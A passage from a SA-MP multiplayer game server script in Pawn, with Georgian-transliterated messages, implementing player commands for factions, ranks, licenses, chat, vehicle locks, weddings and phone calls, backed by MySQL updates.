		for(new i;i<m;i++)
		{
			if(pData[actplayerid][pRank] == i+1)
			{
                if(!i) format(mes2,sizeof(mes2),"%d. %s\n",i+1,gFractionRankName[fractionid][i]);
				else format(mes2,sizeof(mes2),"%s%d. %s\n",mes2,i+1,gFractionRankName[fractionid][i]);
            }
			else
			{
			    if(!i) format(mes2,sizeof(mes2),"%d. %s\n",i+1,gFractionRankName[fractionid][i]);
				else format(mes2,sizeof(mes2),"%s%d. %s\n",mes2,i+1,gFractionRankName[fractionid][i]);
			}
		}
		ShowPlayerDialog(playerid,dSetRank,2,"Rankis Shecvla",mes2,"Shecvla","Daxurva");
	}
	if(!strcmp(cmd,"/changeskin",true))
	{
		if(!pData[playerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Organizaciis Wevri");
		new fractionid = pData[playerid][pFraction] - 1;
		if(!IsAbleToUninvite(playerid)) return SendClientMessage(playerid,CGRAY,"Tqveni Ranki Ar Aris Sakmarisi");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/changeskin [ID Motamashis]");
		new actplayerid = strval(tmp);
		if(!IsPlayerConnected(actplayerid)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(pData[actplayerid][pFraction] != pData[playerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Motamashe Ar Aris Tqvens Organizaciashi");
		if(pData[actplayerid][pRank] >= pData[playerid][pRank] && actplayerid != playerid) return SendClientMessage(playerid,CGRAY,"Tqveni Ranki Ar Aris Sakmarisi");
		SetPVarInt(playerid,"actplayerid",actplayerid);
		new mes2[256];
		for(new i;i<8;i++)
		{
			new skinid = gFractionSkin[fractionid][i];
			if(!skinid) break;
			if(skinid == pData[actplayerid][pFractionSkin])
			{
				if(!i) format(mes2,sizeof(mes2),"%d. Skin [{"#cYELLOW"}№%d{ffffff}]",i+1,skinid);
				else format(mes2,sizeof(mes2),"%s\n%d. Skin [{"#cYELLOW"}№%d{ffffff}]",mes2,i+1,skinid);
			}
			else
			{
				if(!i) format(mes2,sizeof(mes2),"%d. Skin [{"#cGREEN"}№%d{ffffff}]",i+1,skinid);
				else format(mes2,sizeof(mes2),"%s\n%d. Skin [{"#cGREEN"}№%d{ffffff}]",mes2,i+1,skinid);
			}
		}
		ShowPlayerDialog(playerid,dFractionSkin,2,Name2(actplayerid),mes2,"OK","CLOSE");
	}
	if(!strcmp(cmd,"/uninvite",true))
	{
		if(!pData[playerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Organizaciis Wevri");
		if(!IsAbleToUninvite(playerid)) return SendClientMessage(playerid,CGRAY,"Tqveni Ranki Ar Aris Sakmarisi");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/uninvite [ID Motamashis]");
		new actplayerid = strval(tmp);
		if(!IsPlayerConnected(actplayerid) || actplayerid == playerid) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(pData[actplayerid][pFraction] != pData[playerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Motamashe Ar Aris Tqvens Organizaciashi");
		if(pData[actplayerid][pRank] >= pData[playerid][pRank]) return SendClientMessage(playerid,CGRAY,"Tqveni Ranki Ar Aris Sakmarisi");
		if(gNewsDialer == actplayerid) OnPlayerCommandText(actplayerid,"/stopdial");
		new query[180];
		format(query,sizeof(query),"UPDATE `members` SET `fraction` = '0', `rank` = '0', `fractionskin` = '0', `subfraction` = '0' WHERE `nickname` = '%s'",Name2(actplayerid));
		mysql_empty(mysql, query);
		if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL");
		pData[actplayerid][pFraction] = 0;
		pData[actplayerid][pRank] = 0;
		pData[actplayerid][pFractionSkin] = 0;
		pData[actplayerid][pSubfraction] = 0;
		SetPlayerColor(actplayerid,0xFFFFFF11);
		new houseid = pData[actplayerid][pHouse]-1;
		if(!(houseid+1) || ((houseid+1) > 0 && !GetString(Name2(actplayerid),gHouses[houseid][houseOwner]))) SetPlayerSkin(actplayerid,pData[actplayerid][pSkin]);
		else if(!gHouses[houseid][houseImprove][1]) SetPlayerSkin(actplayerid,pData[actplayerid][pSkin]);
		else
		{
			for(new x; x < 3; x ++) {
				if(!gHouses[houseid][houseSkin]) continue;
				pData[actplayerid][pSkin] = gHouses[houseid][houseSkin];
				if(GetPlayerSkin(actplayerid) == gHouses[houseid][houseSkin][3]) SetPlayerSkin(actplayerid,pData[actplayerid][pSkin]);
			}
			gHouses[houseid][houseSkin][3] = 0;
			UpdateHouseDress(houseid);
		}
		format(mes,sizeof(mes),"%s Tqven Gagatavisufles Organizaciidan.",Name2(playerid));
		SendClientMessage(actplayerid,CBADINFO,mes);
		format(mes,sizeof(mes),"%s Gatavisuflebuli Iqna Organizaciidan.",Name2(actplayerid));
		SendClientMessage(playerid,CINFO,mes);
	}
	if(!strcmp(cmd,"/oleave",true))
	{
	    if(pData[playerid][pOfforg] < 1) return true;
		new query[180];
		format(query,sizeof(query),"UPDATE `members` SET `offorg` = '0', `offrang` = '0' WHERE `nickname` = '%s'",Name2(playerid));
		mysql_empty(mysql, query);
		if(mysql_errno()) return SendClientMessage(playerid,CRED,"Ошибка MySQL.");
		pData[playerid][pOfforg] = 0;
		pData[playerid][pOffrang] = 0;
		SendClientMessage(playerid,CYELLOW,"Tqven Warmatebit Datovet Un.Off Organizacia.");
	}
	if(!strcmp(cmd,"/ouninvite",true))
	{
		if(pData[playerid][pOfforg] < 1) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Organizaciis Wevri");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/ouninvite [ID Motamashis]");
		new actplayerid = strval(tmp);
		if(!IsPlayerConnected(actplayerid) || actplayerid == playerid) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(pData[actplayerid][pOfforg] != pData[playerid][pOfforg]) return SendClientMessage(playerid,CGRAY,"Motamashe Ar Aris Tqvens Organizaciashi");
		if(pData[playerid][pOffrang] != 10) return SendClientMessage(playerid,CGRAY,"Tqveni Ranki Ar Aris Sakmarisi");
		new query[180];
		format(query,sizeof(query),"UPDATE `members` SET `offorg` = '0', `offrang` = '0' WHERE `nickname` = '%s'",Name2(actplayerid));
		mysql_empty(mysql, query);
		if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL");
		pData[actplayerid][pOfforg] = 0;
		pData[actplayerid][pOffrang] = 0;
		format(mes,sizeof(mes),"%s Tqven Gagatavisufles Organizaciidan.",Name2(playerid));
		SendClientMessage(actplayerid,CBADINFO,mes);
		format(mes,sizeof(mes),"%s Gatavisuflebuli Iqna Organizaciidan.",Name2(actplayerid));
		SendClientMessage(playerid,CINFO,mes);
	}
	if(!strcmp(cmd,"/oinvite",true))
	{
		if(pData[playerid][pOfforg] < 1) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Organizaciis Wevri");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/oinvite [ID Motamashis]");
		new actplayerid = strval(tmp);
		if(!IsPlayerConnected(actplayerid) || actplayerid == playerid) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(pData[actplayerid][pOfforg] > 0) return SendClientMessage(playerid,CGRAY,"Motamashe Aris Sxva Un.Off Organizaciashi");
		if(pData[playerid][pOffrang] < 9) return SendClientMessage(playerid,CGRAY,"Tqveni Ranki Ar Aris Sakmarisi");
		if(GetPlayerDistanceToPlayer(playerid,actplayerid) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(actplayerid)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		new query[180];
		format(query,sizeof(query),"UPDATE `members` SET `offorg` = '%d', `offrang` = '1' WHERE `nickname` = '%s'",pData[playerid][pOfforg],Name2(actplayerid));
		mysql_empty(mysql, query);
		if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL");
		pData[actplayerid][pOfforg] = pData[playerid][pOfforg];
		pData[actplayerid][pOffrang] = 1;
		format(mes,sizeof(mes),"%s Tqven Gagatavisufles Organizaciidan.",Name2(playerid));
		SendClientMessage(actplayerid,CINFO,mes);
		format(mes,sizeof(mes),"%s Gatavisuflebuli Iqna Organizaciidan.",Name2(actplayerid));
		SendClientMessage(playerid,CINFO,mes);
	}
	if(!strcmp(cmd, "/ogiverank", true))
	{
	    if(pData[playerid][pOfforg] < 1) return true;
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/ogiverank [ID Motamashis] [Ranki (1-10)]");
	    new actplayerid = strval(tmp);
	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/ogiverank [ID Motamashis] [Ranki (1-10)]");
        if(pData[actplayerid][pOfforg] != pData[playerid][pOfforg]) return SendClientMessage(playerid, CINFO, "Motamashe Ar Aris Tqven Un.Off Organizaciashi.");
		if(pData[playerid][pOffrang] != 10) return SendClientMessage(playerid, CINFO, "Tqveni Ranki Ar Aris Sakmarisi.");
        new level = strval(tmp);
		if(level == 0) return SendClientMessage(playerid, CGRAY, "Gamoiyenet /uninvite.");
		if(level > 10) return SendClientMessage(playerid, CGRAY, "Max - 10");
	    pData[actplayerid][pOffrang] = level;
	    SendClientMessage(playerid, CINFO, "Tqven Sheumciret / Moumatet Ranki.");
		UpdatePlayerData(actplayerid,"offrang",pData[actplayerid][pOffrang]);
		SendClientMessage(actplayerid, CINFO, "Tqven Agimagldat Araopicialuri Organizaciis Ranki.");
		return true;
	}
	if(!strcmp(cmd,"/members",true))
	{
		if(!pData[playerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Organizaciis Wevri");
		new fractionid = pData[playerid][pFraction] - 1;
		new subfraction = GetSubfractionID(fractionid);
		if(subfraction == -1)
		{
			format(mes,sizeof(mes),"%s {"#cGREEN"}Online:",gFractionName[fractionid]);
			SendClientMessage(playerid,CINFO,mes);
			for(new idxf=0, g=1, i=0; idxf<cvector_size(players); idxf++)
			{
		     	i = cvector_get(players, idxf);
				if(!IsPlayerConnected(i)) continue;
				if(pData[i][pFraction] != fractionid+1) continue;
				format(mes,sizeof(mes),"%d. %s[%d], {0C97C2}[%d rang]",g++,Name2(i),i,pData[i][pRank]);
				SendClientMessage(playerid,CSYSTEM,mes);
			}
		}
		else
		{
			new subfractionid;
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp) || !isNumeric(tmp)) subfractionid = pData[playerid][pSubfraction] - 1;
			else subfractionid = strval(tmp)-1;
			if(subfractionid < 0 || subfraction > 3 || !strlen(gSubfractionName[subfraction][subfractionid])) return SendClientMessage(playerid,CGRAY,"Araswori ID Subleaderis");
			format(mes,sizeof(mes),"%s {"#cGREEN"}Online:",gSubfractionName[subfraction][subfractionid]);
			SendClientMessage(playerid,CINFO,mes);
			for(new idxf=0, g=1, i=0; idxf<cvector_size(players); idxf++)
			{
		     	i = cvector_get(players, idxf);
				if(!IsPlayerConnected(i)) continue;
				if(pData[i][pFraction] != fractionid+1 || pData[i][pSubfraction] != subfractionid + 1) continue;
				format(mes,sizeof(mes),"%d. %s[%d], {0C97C2}[%d rang]",g++,Name2(i),i,pData[i][pRank]);
				SendClientMessage(playerid,CSYSTEM,mes);
			}
		}
	}
 	if(!strcmp(cmd,"/leave",true))
	{
	    if(!pData[playerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Organizaciis Wevri");
		if(IsALeader(playerid)) return SendClientMessage(playerid,CGRAY,"Liderma Shewyvita Moweva.");
		if(gNewsDialer == playerid) OnPlayerCommandText(playerid,"/stopdial");
		new fractionid = pData[playerid][pFraction]-1;
		format(mes,sizeof(mes),"%s[%d] Datova Organizacia Tavisi Survilit",Name2(playerid),playerid);
  		for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			if(IsPlayerConnected(i) && pData[i][pFraction] == fractionid+1 && pData[i][pSubfraction] == pData[playerid][pSubfraction] && !pData[i][pJail])
			{
		    	SendClientMessage(i,0xFF6200FF,mes);
			}
		}
	    new query[180];
		format(query,sizeof(query),"UPDATE `members` SET `fraction` = '0', `rank` = '0', `fractionskin` = '0', `subfraction` = '0' WHERE `nickname` = '%s'",Name2(playerid));
		mysql_empty(mysql, query);
		if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL");
		pData[playerid][pFraction] = 0;
		pData[playerid][pRank] = 0;
		pData[playerid][pFractionSkin] = 0;
		pData[playerid][pSubfraction] = 0;
		SetPlayerColor(playerid,0xFFFFFF11);
		new houseid = pData[playerid][pHouse]-1;
		if(!(houseid+1) || ((houseid+1) > 0 && !GetString(Name2(playerid),gHouses[houseid][houseOwner]))) SetPlayerSkin(playerid,pData[playerid][pSkin]);
		else if(!gHouses[houseid][houseImprove][1]) SetPlayerSkin(playerid,pData[playerid][pSkin]);
		else
		{
			for(new x; x < 3; x ++) {
				if(!gHouses[houseid][houseSkin]) continue;
				pData[playerid][pSkin] = gHouses[houseid][houseSkin];
				if(GetPlayerSkin(playerid) == gHouses[houseid][houseSkin][3]) SetPlayerSkin(playerid,pData[playerid][pSkin]);
			}
			gHouses[houseid][houseSkin][3] = 0;
			UpdateHouseDress(houseid);
		}
		SendClientMessage(playerid,CYELLOW,"Tqven Datovet Organizacia Tqveni Survilit.");
	}
	if(!strcmp(cmd,"/heal",true))
	{
		if(pData[playerid][pFraction] != 2) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod Eqimistvis");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/heal [ID Motamashis] [Fasi]");
		new actplayerid = strval(tmp);
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/heal [ID Motamashis] [Fasi]");
		new price = strval(tmp);
		if(price < 50 || price > 500) return SendClientMessage(playerid,CGRAY,"Mkurnalobis Fasi Unda Ikos $50-Dan $500-Mde");
		if(GetPlayerDistanceToPlayer(playerid,actplayerid) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(actplayerid)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		SetPVarInt(actplayerid,"healprice",price);
		SetPVarInt(actplayerid,"doctorid",playerid);
		SPFD(actplayerid,dHeal,0,"Med. Momsaxureba","YES","NO","{"#cWHITE"}%s Gtavazobt Gamogajanmrtelot: $%d",Name2(playerid),price);
	}
	if(!strcmp(cmd, "/givelic", true))
	{
	    if(pData[playerid][pFraction] != 1) return true;
	    tmp = strtok(cmdtext, idx);
	    if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/givelic [ID Motamashis] [1 - Prava, 2 - Pilotis, 3 - Navis, 4 - Iaragis]");
	    new actplayerid = strval(tmp);
	    if(!IsPlayerConnected(actplayerid)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
	    if(GetPlayerDistanceToPlayer(playerid,actplayerid) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(actplayerid)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
        tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/givelic [ID Motamashis] [1 - Prava, 2 - Pilotis, 3 - Navis, 4 - Iaragis]");
		new idlic = strval(tmp);
		if(idlic < 1 || idlic > 4) return SendClientMessage(playerid,CGRAY,"Araswori ID Licenziis.");
		if(idlic == 1)
		{
		    pData[actplayerid][pLicenses][LIC_DRIVING] = 1;
		    UpdatePlayerData(actplayerid,"licDrive",pData[actplayerid][pLicenses][LIC_DRIVING]);
		    SendClientMessage(playerid, CINFO, "Tqven Miecit Motamashes Martvis Mowmoba.");
		    SendClientMessage(actplayerid, CGREEN, "Gilocavt, Tqven Gadmogecat Martvis Mowmoba.");
		}
		if(idlic == 2)
		{
		    pData[actplayerid][pLicenses][LIC_FLY] = 1;
		    UpdatePlayerData(actplayerid,"licFly",pData[actplayerid][pLicenses][LIC_FLY]);
		    SendClientMessage(playerid, CINFO, "Tqven Miecit Motamashes Pilotis Licenzia.");
		    SendClientMessage(actplayerid, CGREEN, "Gilocavt, Tqven Gadmogecat Pilotis Licenzia.");
		}
		if(idlic == 3)
		{
		    pData[actplayerid][pLicenses][LIC_BOAT] = 1;
		    UpdatePlayerData(actplayerid,"licBoat",pData[actplayerid][pLicenses][LIC_BOAT]);
		    SendClientMessage(playerid, CINFO, "Tqven Miecit Motamashes Wylis Transportis Licenzia.");
		    SendClientMessage(actplayerid, CGREEN, "Gilocavt, Tqven Gadmogecat Wylis Transportis Licenzia.");
		}
		if(idlic == 4)
		{
		    pData[actplayerid][pLicenses][LIC_WEAP] = 1;
		    UpdatePlayerData(actplayerid,"licWeap",pData[actplayerid][pLicenses][LIC_WEAP]);
		    SendClientMessage(playerid, CINFO, "Tqven Miecit Motamashes Iaragis Licenzia.");
		    SendClientMessage(actplayerid, CGREEN, "Gilocavt, Tqven Gadmogecat Iaragis Licenzia.");
		}
		return true;
	}
	if(!strcmp(cmd,"/or",true))
	{
		if(!pData[playerid][pOfforg]) return SendClientMessage(playerid,CGRAY,"Shentvis Araa Xelmisawvdomi Es Funqcia.");
		if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Shen Gadevs Mute.");
		if(pData[playerid][pJail]) return SendClientMessage(playerid, CGRAY, "Tqven Xart Cixeshi.");
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/or [Texti]");
		if(strlen(tmp) < 1 || strlen(tmp) > 70) return SendClientMessage(playerid,CGRAY,"Texti Dzalian Grdzelia, Daweret Mokle Texti.");
		if(IsIP(tmp) || CheckString(tmp)) return Proverka(playerid, tmp);
		format(mes,sizeof(mes),"[OR] [%d ранг] %s[%d]: %s",pData[playerid][pOffrang],Name2(playerid),playerid,tmp);
  		for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			if(IsPlayerConnected(i) && pData[i][pOfforg] == pData[playerid][pOfforg] && !pData[i][pJail])
			{
		    	SendClientMessage(i,0x21BF92FF,mes);
			}
		}
	}
	if(!strcmp(cmd,"/r",true))
	{
		if(!pData[playerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Shentvis Araa Xelmisawvdomi Es Funqcia.");
		if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Shen Gadevs Mute.");
		if(pData[playerid][pJail]) return SendClientMessage(playerid, CGRAY, "Tqven Xart Cixeshi.");
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/r [Texti]");
		if(strlen(tmp) < 1 || strlen(tmp) > 70) return SendClientMessage(playerid,CGRAY,"Texti Dzalian Grdzelia, Daweret Mokle Texti.");
		if(IsIP(tmp) || CheckString(tmp)) return Proverka(playerid, tmp);
		new fractionid = pData[playerid][pFraction]-1;
		new rank = pData[playerid][pRank];
		new mesid[128];
		format(mesid,sizeof(mes),"[R] [%s] %s[%d]: %s",gFractionRankName[fractionid][rank-1],Name2(playerid),playerid,tmp);
		format(mes,sizeof(mes),"[R] [%s] %s: %s",gFractionRankName[fractionid][rank-1],Name2(playerid),tmp);
  		for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			if(IsPlayerConnected(i) && pData[i][pFraction] == fractionid+1 && pData[i][pSubfraction] == pData[playerid][pSubfraction] && !pData[i][pJail])
			{
		    	SendClientMessage(i,0x9579ABFF,mes);
			}
		}
	}
	if(!strcmp(cmd,"/payday",true))
	{
		if(pData[playerid][pAdmin] < 6) return true;
		//mysql_query("UPDATE `houses` SET `day`=`day`-1 WHERE `day`>0");
		/*new query[512];
		format(query,sizeof(query),"UPDATE `houses` SET `ownerid` = '0', `owner` = '', `day` = '0', improve = '0|0|0|0|0', gun = '0|0|0|0|0|0|0|0|0', skin = '0|0|0|0',safecode='0', safemoney='0', drugs='0', products='0',inhabit2id = '0',inhabit3id = '0',inhabit4id = '0',inhabit2='',inhabit3='',inhabit4='' WHERE `day` = '0'");
		mysql_query(mysql, query, false);*/
		//new query[512];
		//format(query,sizeof(query),"UPDATE `members` SET `ban` = '0' WHERE `ban` > '0'");
		//mysql_query(mysql, query, false);
		PayDay();
	}
	if(!strcmp(cmd,"/lock",true))
	{
		new type = 1;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) type = 1;
		else type = strval(tmp);
		if (type > 3 || type < 1) type = 1;
		new carid;
		if(pData[playerid][pCar] && type == 1) carid = pData[playerid][pCar];
		else if(pData[playerid][pVehicleKey] && type == 3) carid = pData[playerid][pVehicleKey];
		else if(type == 2) {
		    new vehicleid = carid;
			if(pData[playerid][pJob] == 3 && pTemp[playerid][pTaxiID] != INVALID_PLAYER_ID)
			{
				vehicleid = pTemp[playerid][pTaxiID];
			}
			else if(pData[playerid][pJob] == 4 && pTemp[playerid][pMechID] != INVALID_VEHICLE_ID )
			{
				vehicleid = pTemp[playerid][pMechID];
			}
			else return SendClientMessage(playerid,CGRAY,"Tqven Ar Gyavt Samushao Transporti.");
			if(ToggleLock(vehicleid)) GameTextForPlayer(playerid,"~r~locked",3000,3);
			else GameTextForPlayer(playerid,"~g~unlocked",3000,3);
			return true;
		}
		else return SendClientMessage(playerid,CGRAY,"Tqven Argyavt Avtomobili.");
		if(!gVehicles[gVehicles[pData[playerid][pHouse]][vvID]-1][vLock])
		{
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
			{
  				i = cvector_get(players, idxf);
				if(IsPlayerConnected(i) && IsVehicleStreamedIn(gVehicles[pData[playerid][pHouse]][vvID],i)) SetVehicleParamsForPlayer(gVehicles[pData[playerid][pHouse]][vvID],i,0,1);
			}
			gVehicles[gVehicles[pData[playerid][pHouse]][vvID]-1][vLock] = 1;
			GameTextForPlayer(playerid,"~r~locked",3000,3);
		}
		else if(gVehicles[gVehicles[pData[playerid][pHouse]][vvID]-1][vLock])
		{
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
			{
  				i = cvector_get(players, idxf);
				if(IsPlayerConnected(i) && IsVehicleStreamedIn(gVehicles[pData[playerid][pHouse]][vvID],i)) SetVehicleParamsForPlayer(gVehicles[pData[playerid][pHouse]][vvID],i,0,0);
			}
			gVehicles[gVehicles[pData[playerid][pHouse]][vvID]-1][vLock] = 0;
			GameTextForPlayer(playerid,"~g~unlocked",3000,3);
		}
	}
	if(!strcmp(cmd,"/wedding",true))
	{
  		tmp = strtok(cmdtext, idx);
  		if(!IsPlayerInRangeOfPoint(playerid,2,2224.9885,2522.8726,11.2222)) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Eklesiashi.");
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid, CGRAY, "/wedding [ID Motamashis]");
		new actplayerid = strval(tmp);
  		if(!IsPlayerInRangeOfPoint(actplayerid,2,2224.9885,2522.8726,11.2222)) return SendClientMessage(playerid,CGRAY,"Gogona, Sadac Tqven Gsurt Daqorwineba Ar Aris Eklesia.");
  		if(pData[playerid][pDivorce]) return SendClientMessage(playerid, CGRAY, "Tqven Colad.");
  		if(pData[playerid][pSex] == 2) return SendClientMessage(playerid,CGRAY,"Gogona Ver Txovs Xels.");
  		if(!IsPlayerConnected(actplayerid) || playerid == actplayerid) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
  		if(pData[playerid][pSex] == pData[actplayerid][pSex]) return SendClientMessage(playerid,CGRAY,"Ertsqesianta Qorwineba Akrdzalulia.");
    	if(IsPlayerConnected(actplayerid))
		{
			if(pData[actplayerid][pDivorce]) return SendClientMessage(playerid, CGRAY, "Tqveni Sacole Ukve Daqorwinebulia.");
		    if(GetPlayerDistanceToPlayer(playerid,actplayerid) > 20.0) return SendClientMessage(playerid, CGRAY, "Tqven Xart Shors Ertmanetisgan.");
            format(mes,sizeof(mes),"Tqven Shestavazet {"#cWHITE"}%s {"#cINFO"} Gamogyvet Colad",Name2(actplayerid));
			SendClientMessage(playerid,CINFO,mes);
			format(mes,sizeof(mes),"{"#cWHITE"}%s {"#cINFO"} Gtxovat Qorwineba.",Name2(playerid));
			SendClientMessage(actplayerid,CINFO,mes);
			SendClientMessage(actplayerid,CINFO,"Amis Dasadastureblad Daachiret {"#cGREEN"}Y{"#cINFO"}, Uaryofistvis {"#cRED"}N");
			WeddingTwo[actplayerid] = playerid;
			SetPVarInt(actplayerid,"Wed",2);
	 	}
	}
 	if(!strcmp(cmd,"/divorce",true))
	{
	    if(!IsPlayerInRangeOfPoint(playerid,2,2224.9885,2522.8726,11.2222)) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Eklesiashi.");
		new string[128];
		if(!pData[playerid][pDivorce]) return SendClientMessage(playerid, CGRAY, "Tqven Ar Gyavt Qmari.");
		format(string,sizeof(string),"{ffffff}Tqveni Meugle: {"#cINFO"}%s\n\n{ffffff}Gindar Rom Damtavrdes Qorwineba?",pData[playerid][pDivorce]);
		ShowPlayerDialog(playerid,dRazvod,DIALOG_STYLE_MSGBOX ,"Archevani",string,"YES","NO");
	}
	if(!strcmp(cmd,"/b",true))
	{
	    if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Tqven Gadevt Mute.");
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/b [Texti]");
		if(IsIP(tmp) || CheckString(tmp)) return Proverka(playerid, tmp);
		format(mes,sizeof(mes),"%s[%d]: (( {"#cGRAY"}%s {"#cWHITE"}))", Name2(playerid), playerid, tmp);
		ProxDetector(playerid,mes,CWHITE);
	}
	if(!strcmp(cmd,"/s",true))
	{
	    if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Tqven Gadevt Mute.");
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/s [Texti]");
		if(IsIP(tmp) || CheckString(tmp)) return Proverka(playerid, tmp);
		format(mes,sizeof(mes),"- %s[%d] Yviris: {bbbbbb}%s", Name2(playerid), playerid, tmp);
		ProxDetector(playerid,mes,CWHITE);
	}
	if(!strcmp(cmd,"/lic",true))
	{
	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/lic [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id) || IsKicked(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		if(GetPlayerDistanceToPlayer(playerid,id) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		format(mes,sizeof(mes),"Tqven Shestavazet {"#cWHITE"}%s {"#cINFO"} Achvenot Licenziebi.",Name2(id));
		SendClientMessage(playerid,CINFO,mes);
		format(mes,sizeof(mes),"%s {"#cINFO"}Shemogtavazat Gachvenot Tavisi Licenziebi.",Name2(playerid));
		SendClientMessage(id,CWHITE,mes);
		SendClientMessage(id,CINFO,"Amis Dasadastureblad Daachiret {"#cGREEN"}Y{"#cINFO"} Uaryofistvis {"#cRED"}N");
		pTemp[id][pShowLicpl] = playerid;
		pTemp[id][pShowLicact] = id;
	}
	if(!strcmp(cmd, "/number", true))
	{
	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/number [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis.");
		format(mes, sizeof(mes), "Mflobeli: %s. Abonentis Telefonis Nomeri: %d",Name2(id),pData[id][pPhone]);
		SendClientMessage(playerid, CWHITE, mes);
		return true;
	}
	if (!strcmp(cmd,"/time",true))
	{
		if(!pData[playerid][pWatch]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Saati, Iyidet Is 24/7-Shi");
		new h,m,s;
		gettime(h,m,s);
		new mes2[90];
		format(mes2,sizeof(mes2),"%s%d:%s%d:%s%d",(h < 10) ? ("0") : (""), h, (m < 10) ? ("0") : (""), m, (s < 10) ? ("0") : (""), s);
		GameTextForPlayer(playerid,mes2,5000,1);
		ApplyAnimation(playerid,"COP_AMBIENT","Coplook_watch",4.1,0,0,0,0,2000,1);
	}
	if (!strcmp(cmd,"/c",true) || !strcmp(cmd,"/call",true))
	{
		if(!pData[playerid][pPhone]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Telefoni, Iyidet Is 24/7-Shi");
		if(GetPVarInt(playerid,"TPhone") == 0 || GetPVarInt(playerid,"TPhone") == 2) return SendClientMessage(playerid,CGRAY,"Tqven Unda Chartot Telefoni. Gamoiyenet: /togphone");
		if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Tqven Gadevt Mute");
		if(gCalls[playerid][g_caller] != INVALID_PLAYER_ID || gCalls[playerid][g_callee] != INVALID_PLAYER_ID) return SendClientMessage(playerid,CGRAY,"Pirveli, Laparakis Dasruleba: (/h)");
		tmp = strtok(cmdtext, idx);
